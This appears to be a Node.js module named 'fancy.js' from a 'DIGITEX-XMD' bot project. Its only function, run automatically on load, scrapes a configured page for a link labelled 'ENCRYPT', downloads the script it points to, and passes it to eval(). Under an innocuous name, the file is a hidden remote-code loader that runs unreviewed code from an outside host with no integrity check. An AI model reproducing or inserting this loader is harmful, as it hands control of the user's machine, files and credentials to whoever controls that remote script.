//  [DIGITEX-XMD EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Juma                                    
//  >> Version: 8.3.5-digitex.7

const axios = require('axios');
const cheerio = require('cheerio');
const juma = require(__dirname + "/../config");

async function fetchENCRYPTUrl() {
  try {
    const response = await axios.get(juma.DIGITEX_XMD_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("ENCRYPT")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('ENCRYPT not found 😭');
    }

    console.log('ENCRYPT loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchENCRYPTUrl();

fancy.js
